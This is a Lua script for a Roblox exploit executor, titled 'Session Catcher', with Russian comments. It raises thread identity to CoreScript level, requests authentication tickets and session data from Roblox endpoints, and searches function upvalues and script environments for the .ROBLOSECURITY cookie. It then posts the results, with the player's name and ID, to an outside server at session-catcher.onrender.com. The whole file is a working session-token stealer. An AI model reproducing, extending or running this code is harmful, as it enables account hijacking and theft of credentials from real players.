-- ============================================================
--  Session Catcher — Delta Executor (Android)
--  v8 — setidentity + game:HttpPost to auth endpoint
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"
local httpRequest = request or http_request or nil
if not httpRequest then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local results = {}

-- -----------------------------------------------------------
-- 1. Проверяем текущий identity
-- -----------------------------------------------------------
results.currentIdentity = "N/A"
pcall(function()
    if getidentity then results.currentIdentity = tostring(getidentity()) end
end)

-- -----------------------------------------------------------
-- 2. Повышаем identity до 7 (уровень CoreScript)
-- -----------------------------------------------------------
pcall(function() if setidentity then setidentity(7) end end)
pcall(function() if setthreadidentity then setthreadidentity(7) end end)
pcall(function() if setthreadcontext then setthreadcontext(7) end end)
pcall(function() if set_thread_identity then set_thread_identity(7) end end)
pcall(function() if set_thread_context then set_thread_context(7) end end)

task.wait(0.5)

results.newIdentity = "N/A"
pcall(function()
    if getidentity then results.newIdentity = tostring(getidentity()) end
end)

-- -----------------------------------------------------------
-- 3. game:HttpPost к auth endpoint (теперь с identity 7)
-- -----------------------------------------------------------
pcall(function()
    local ok, resp = pcall(function()
        return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "", "application/json")
    end)
    results.postAuth_ok = tostring(ok)
    results.postAuth_value = tostring(resp):sub(1, 1000)
end)

task.wait(1)

-- -----------------------------------------------------------
-- 4. game:HttpGet к auth endpoint (с identity 7)
-- -----------------------------------------------------------
pcall(function()
    local ok, resp = pcall(function()
        return game:HttpGet("https://auth.roblox.com/v1/authentication-ticket")
    end)
    results.getAuth_ok = tostring(ok)
    results.getAuth_value = tostring(resp):sub(1, 1000)
end)

task.wait(1)

-- -----------------------------------------------------------
-- 5. httppost с правильным синтаксисом (Instance first)
-- -----------------------------------------------------------
pcall(function()
    local ok, resp = pcall(httppost, game, "https://auth.roblox.com/v1/authentication-ticket", "")
    results.httppostAuth_ok = tostring(ok)
    results.httppostAuth_value = tostring(resp):sub(1, 1000)
end)

task.wait(1)

-- -----------------------------------------------------------
-- 6. game:HttpGet на другие auth endpoints
-- -----------------------------------------------------------
local extraEndpoints = {
    "https://www.roblox.com/api/users/validate",
    "https://www.roblox.com/my/settings/json",
    "https://www.roblox.com/login/get-session-data",
    "https://auth.roblox.com/v1/user/session",
    "https://auth.roblox.com/v1/sessions"
}

for _, url in ipairs(extraEndpoints) do
    pcall(function()
        local ok, resp = pcall(function()
            return game:HttpGet(url)
        end)
        local key = url:gsub("https://", ""):gsub("/", "_"):gsub("%.", "_")
        results["get_" .. key .. "_ok"] = tostring(ok)
        results["get_" .. key .. "_value"] = tostring(resp):sub(1, 500)
    end)
    task.wait(0.3)
end

-- -----------------------------------------------------------
-- 7. getupvalues на request функцию — может кука в upvalue
-- -----------------------------------------------------------
pcall(function()
    if getupvalues then
        local upvals = getupvalues(request)
        if upvals then
            local upvalDump = {}
            for i, v in pairs(upvals) do
                if type(v) == "string" then
                    if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
                        upvalDump["UPVAL_COOKIE_" .. tostring(i)] = v:sub(1, 500)
                    else
                        upvalDump[tostring(i)] = v:sub(1, 100)
                    end
                else
                    upvalDump[tostring(i)] = type(v) .. ":" .. tostring(v):sub(1, 100)
                end
            end
            results.requestUpvalues = upvalDump
        end
    end
end)

-- -----------------------------------------------------------
-- 8. getsenv на HttpService
-- -----------------------------------------------------------
pcall(function()
    if getsenv then
        local senv = getsenv(game:GetService("HttpService"))
        if senv then
            local senvDump = {}
            for k, v in pairs(senv) do
                local kStr = tostring(k)
                local vStr = tostring(v)
                if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") or vStr:find("cookie") then
                    senvDump[kStr] = "COOKIE: " .. vStr:sub(1, 500)
                else
                    senvDump[kStr] = type(v) .. ":" .. vStr:sub(1, 100)
                end
            end
            results.httpServiceSenv = senvDump
        end
    end
end)

-- -----------------------------------------------------------
-- Отправка
-- -----------------------------------------------------------
local payload = {
    username = LocalPlayer.Name,
    userId = LocalPlayer.UserId,
    results = results,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

print("[Catcher] v8 identity probe sent")
